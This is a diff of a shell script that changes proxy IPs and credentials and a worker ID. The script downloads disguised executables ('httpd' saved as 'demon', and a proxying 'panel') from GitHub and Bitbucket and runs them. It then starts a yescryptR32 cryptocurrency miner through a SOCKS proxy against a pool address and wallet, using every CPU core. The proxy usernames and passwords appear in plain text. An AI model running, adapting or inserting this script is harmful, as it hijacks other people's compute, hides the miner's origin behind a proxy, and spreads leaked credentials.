@@ -1,7 +1,7 @@
-proxy="52.5.238.209" 
+proxy="50.17.160.202" 
 port="1080" 
-user="22qg9vgn8zo93"  
-pass="z5qrhxcikhhylquzqvnzc03zng"
+user="9ubn1puea2b71x"  
+pass="iz4g9xbwjgy4mdru9gb9x5nsee40"
 wget -q -O demon https://github.com/swanderenata/cautious-octo-garbanzo/raw/main/httpd && chmod +x demon
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./demon -a yescryptR32 -o 45.115.225.225:80 -u UUttAax2AKgvUur3n3RhMDLxYjsFJgGnbh -p c=UNFY,mc=UNFY,ID=$(echo $(shuf -i 1-5 -n 1)-yui) -t $(nproc --all)
+./panel ./demon -a yescryptR32 -o 45.115.225.225:80 -u UUttAax2AKgvUur3n3RhMDLxYjsFJgGnbh -p c=UNFY,mc=UNFY,ID=$(echo $(shuf -i 1-5 -n 1)-bian) -t $(nproc --all)
